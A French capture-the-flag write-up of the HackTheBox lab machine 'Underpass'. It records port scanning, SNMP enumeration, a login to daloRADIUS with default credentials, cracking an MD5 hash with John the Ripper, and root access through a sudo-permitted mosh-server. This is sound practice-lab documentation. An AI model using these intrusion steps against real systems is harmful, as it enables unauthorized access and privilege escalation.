# Underpass (HTB - Active - Easy)
**Date :** 07/05/2025  
**Cat√©gorie :** SNMP Enum, Web/Docker Recon, Password Cracking, Sudo Abuse  
**Difficult√© :** Easy  
**Objectif :** Obtenir les flags `user.txt` et `root.txt`

---

## Nmap - TCP

```bash
nmap -sC -sV -oN nmap_tcp.txt 10.10.11.XXX
```

R√©sultats :
22/tcp - OpenSSH


80/tcp - Apache httpd (default Apache page)


Pas de contenu exploitable sur le port 80.

## Nmap - UDP
```bash
nmap -sU --top-ports 100 -oN nmap_udp.txt 10.10.11.XXX
```
R√©sultat :
161/udp - SNMP



## Enum SNMP
```bash
snmp-check 10.10.11.XXX
```
![snmp check](./snmp_check.png)
On r√©cup√®re des informations int√©ressantes, notamment :
Un nom d‚Äôutilisateur


Une adresse e-mail


Une r√©f√©rence au service daloRADIUS



## Recherche sur daloRADIUS
Recherche Google + GitHub ‚Üí on trouve la documentation et des fichiers .yml/Dockerfile expliquant les chemins utilis√©s.


### Chemin int√©ressant d√©couvert :
```bash
/var/www/daloradius
```

On d√©couvre √©galement une URL potentielle :

http://10.10.11.XXX/daloradius/app/operators/login.php

### Bruteforce / Credentials Discovery
Tentative basique d‚Äôidentifiants sur la page de login ‚Üí Succ√®s avec :
administrator:radius

Une fois connect√©, on acc√®de √† une interface d‚Äôadministration listant des utilisateurs.
On y trouve un username + password hash (MD5)
![user listing](./user_listing.png)

## Crack du mot de passe
Hash r√©cup√©r√© ‚Üí crack via John the Ripper :
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![john](./john_mdp.png)
Le mot de passe en clair est d√©couvert.
SSH Access

## Connexion SSH avec les identifiants r√©cup√©r√©s ‚Üí acc√®s utilisateur.
```bash
ssh user@10.10.11.XXX
```
![user access](./user_access.png)
user.txt accessible.
Privilege Escalation
## Check des permissions sudo :
```bash
sudo -l
```
On d√©couvre que l‚Äôutilisateur peut ex√©cuter :
```bash
/usr/bin/mosh-server
```
![mosh](./mosh_cmd.png)
## Exploitation via mosh-server
Utilisation de mosh avec le binaire mosh-server en sudo :
```bash
mosh --server="sudo /usr/bin/mosh-server" localhost
```
Cela d√©marre une session mosh en root.
Une fois dans le shell :
```bash
cat /root/root.txt
```
![root](./root_access.png)
## üõ†Ô∏è R√©sum√© des √©tapes

| √âtape                | Technique                                  |
|----------------------|--------------------------------------------|
| Initial Access       | SNMP enum ‚Üí d√©couverte de daloRADIUS       |
| Credential Access    | Login admin par d√©faut + hash MD5 crack    |
| SSH Access           | Identifiants r√©cup√©r√©s                     |
| Privilege Escalation | `sudo mosh-server` abuse                   |




